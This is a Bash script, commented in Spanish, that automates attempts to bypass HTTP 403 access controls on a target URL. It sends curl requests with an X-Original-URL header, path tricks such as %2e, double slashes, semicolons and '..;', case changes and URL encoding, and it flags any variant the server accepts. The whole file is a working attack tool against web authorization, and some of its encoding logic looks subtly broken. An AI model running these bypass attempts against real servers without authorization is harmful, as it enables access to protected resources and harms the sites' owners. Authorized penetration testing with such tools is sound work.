#!/bin/bash

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Función para mostrar uso
show_usage() {
    echo "Uso: $0 [URL] [OPCIONES]"
    echo ""
    echo "Ejemplo: $0 http://target.com/admin"
    echo ""
    echo "Opciones:"
    echo "  -h, --help      Mostrar este mensaje de ayuda"
    echo "  -v, --verbose   Mostrar más detalles"
    echo ""
    exit 1
}

# Función para probar una URL
test_url() {
    local url="$1"
    local description="$2"
    
    if [ "$VERBOSE" = true ]; then
        echo -e "${YELLOW}[+] Probando:${NC} $description"
        echo -e "${YELLOW}[+] URL:${NC} $url"
    fi
    
    # Realizar la petición y capturar el código de estado
    status_code=$(curl -s -o /dev/null -w "%{http_code}" "$url" -H "User-Agent: Mozilla/5.0" --max-time 10)
    
    if [[ "$status_code" =~ ^2[0-9][0-9]$ ]] || [[ "$status_code" =~ ^3[0-9][0-9]$ ]]; then
        echo -e "${GREEN}[✓] SUCCESS${NC} - Código: $status_code - $description"
        echo "    URL: $url"
        return 0
    elif [ "$status_code" = "403" ]; then
        if [ "$VERBOSE" = true ]; then
            echo -e "${RED}[✗] 403 Forbidden${NC}"
        fi
        return 1
    elif [ "$status_code" = "000" ]; then
        if [ "$VERBOSE" = true ]; then
            echo -e "${RED}[✗] Timeout/Error${NC}"
        fi
        return 1
    else
        if [ "$VERBOSE" = true ]; then
            echo -e "${YELLOW}[?] Código: $status_code${NC}"
        fi
        return 1
    fi
}

# Función para probar con header X-Original-URL
test_x_original_url() {
    local base_url="$1"
    local path="$2"
    
    # Extraer dominio y ruta base
    domain=$(echo "$base_url" | awk -F/ '{print $3}')
    base_path=$(echo "$base_url" | awk -F"$domain" '{print $2}')
    
    # Construir una ruta cualquiera para el path principal
    random_path="/random-test-$(date +%s)"
    
    # URL para la petición
    url="http://$domain$random_path"
    
    echo -e "${YELLOW}[+] Probando X-Original-URL header${NC}"
    echo -e "${YELLOW}[+] URL base:${NC} $url"
    echo -e "${YELLOW}[+] Header:${NC} X-Original-URL: $path"
    
    # Realizar petición con header personalizado
    response=$(curl -s -i -H "X-Original-URL: $path" -H "User-Agent: Mozilla/5.0" "$url" --max-time 10)
    status_code=$(echo "$response" | head -n 1 | awk '{print $2}')
    
    if [[ "$status_code" =~ ^2[0-9][0-9]$ ]] || [[ "$status_code" =~ ^3[0-9][0-9]$ ]]; then
        echo -e "${GREEN}[✓] SUCCESS${NC} - Código: $status_code - X-Original-URL bypass"
        echo "    URL: $url"
        echo "    Header: X-Original-URL: $path"
        return 0
    else
        if [ "$VERBOSE" = true ]; then
            echo -e "${RED}[✗] Falló${NC} - Código: $status_code"
        fi
        return 1
    fi
}

# Verificar argumentos
if [ $# -eq 0 ]; then
    show_usage
fi

# Variables
URL=""
VERBOSE=false

# Procesar argumentos
while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            show_usage
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        *)
            URL="$1"
            shift
            ;;
    esac
done

# Verificar que se proporcionó URL
if [ -z "$URL" ]; then
    echo -e "${RED}[!] Error: Debes proporcionar una URL${NC}"
    show_usage
fi

echo -e "${GREEN}[*] Iniciando bypass 403 testing${NC}"
echo -e "${GREEN}[*] Target:${NC} $URL"
echo ""

# Extraer partes de la URL
if [[ $URL == http* ]]; then
    protocol=$(echo "$URL" | awk -F:// '{print $1}')
    domain_path=$(echo "$URL" | awk -F:// '{print $2}')
    domain=$(echo "$domain_path" | awk -F/ '{print $1}')
    path="/$(echo "$domain_path" | cut -d/ -f2-)"
else
    protocol="http"
    domain=$(echo "$URL" | awk -F/ '{print $1}')
    path="/$(echo "$URL" | cut -d/ -f2-)"
fi

# Quitar / al final si existe
path=$(echo "$path" | sed 's|/$||')

echo -e "${YELLOW}[*] Analizando URL:${NC}"
echo "  Protocolo: $protocol"
echo "  Dominio:   $domain"
echo "  Ruta:      $path"
echo ""

# 1. Método: URL original (para comparar)
echo -e "${YELLOW}[1] Probando URL original${NC}"
test_url "$protocol://$domain$path" "Original URL"

# 2. Método: X-Original-URL header
test_x_original_url "$protocol://$domain" "$path"

# 3. Método: %2e después de la primera barra
echo ""
echo -e "${YELLOW}[2] Probando con %2e${NC}"
test_url "$protocol://$domain/%2e$path" "With %2e after first slash"

# 4. Métodos con ., /, ;
echo ""
echo -e "${YELLOW}[3] Probando variaciones con ., /, ;${NC}"

# a) Añadir . al final
test_url "$protocol://$domain$path/." "Appending dot (/)"

# b) Doble barra
test_url "$protocol://$domain//$path//" "Double slashes"

# c) Dominio con punto
test_url "$protocol://$domain./$path/." "Domain with dot"

# d) Punto y coma
test_url "$protocol://$domain.;$path" "With semicolon"

# e) Doble barra y punto y coma
test_url "$protocol://$domain//;$path" "Double slash with semicolon"

# 5. Método: ../ después del nombre del directorio
echo ""
echo -e "${YELLOW}[4] Probando con ..;${NC}"
test_url "$protocol://$domain$path..;" "With ..; suffix"

# 6. Método: Cambiar mayúsculas/minúsculas
echo ""
echo -e "${YELLOW}[5] Probando variaciones de mayúsculas${NC}"

# Extraer el último segmento del path
last_segment=$(echo "$path" | awk -F/ '{print $NF}')
rest_of_path=$(echo "$path" | sed "s|/$last_segment$||")

# Generar algunas variaciones de case
variations=(
    "$(echo $last_segment | tr '[:lower:]' '[:upper:]')"      # Todo mayúsculas
    "$(echo $last_segment | tr '[:upper:]' '[:lower:]')"      # Todo minúsculas
    "$(echo $last_segment | sed 's/./\U&/' 2>/dev/null || echo $last_segment)"  # Primera mayúscula
    "a$(echo $last_segment | cut -c2-)"      # Primera minúscula si era mayúscula
)

for var in "${variations[@]}"; do
    if [ ! -z "$var" ] && [ "$var" != "$last_segment" ]; then
        test_url "$protocol://$domain$rest_of_path/$var" "Case variation: $var"
    fi
done

# 7. Método: Codificación URL (variaciones)
echo ""
echo -e "${YELLOW}[6] Probando codificación URL${NC}"

# Codificar algunos caracteres
encoded_path=$(echo "$path" | sed 's|/|%2f|g')
test_url "$protocol://$domain$encoded_path" "URL encoded slashes"

# Codificar solo el último segmento
if [ ! -z "$last_segment" ]; then
    encoded_last=$(echo "$last_segment" | sed 's|.|%&|g' | sed 's|%|%25|g' | sed 's|%%25|%|g')
    test_url "$protocol://$domain$rest_of_path/$encoded_last" "URL encoded last segment"
fi

echo ""
echo -e "${GREEN}[*] Test completado${NC}"
